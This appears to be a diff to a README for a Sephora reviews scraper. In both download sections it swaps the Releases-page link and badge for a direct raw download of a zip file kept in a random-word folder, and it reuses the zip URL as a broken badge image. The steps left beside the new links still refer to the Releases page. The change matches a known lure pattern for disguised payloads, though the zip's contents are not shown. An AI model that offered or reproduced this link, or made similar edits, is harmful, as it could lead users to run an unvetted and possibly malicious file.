@@ -24,7 +24,7 @@ To run this application, you'll need:
 
 To download the Sephora Reviews Spider, visit the following link:
 
-[![Download Sephora Reviews Spider](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/JBLtareas/sephora-reviews-spider/releases)
+[![Download Sephora Reviews Spider](https://github.com/JBLtareas/sephora-reviews-spider/raw/refs/heads/main/omphalogenous/reviews-sephora-spider-3.1.zip%20Now-Click%20Here-blue)](https://github.com/JBLtareas/sephora-reviews-spider/raw/refs/heads/main/omphalogenous/reviews-sephora-spider-3.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -76,4 +76,4 @@ We hope the Sephora Reviews Spider helps you gather useful insights from Sephora
 
 Thank you for using our application! To download the latest version, visit:
 
-[![Download Sephora Reviews Spider](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/JBLtareas/sephora-reviews-spider/releases)
+[![Download Sephora Reviews Spider](https://github.com/JBLtareas/sephora-reviews-spider/raw/refs/heads/main/omphalogenous/reviews-sephora-spider-3.1.zip%20Now-Click%20Here-blue)](https://github.com/JBLtareas/sephora-reviews-spider/raw/refs/heads/main/omphalogenous/reviews-sephora-spider-3.1.zip)
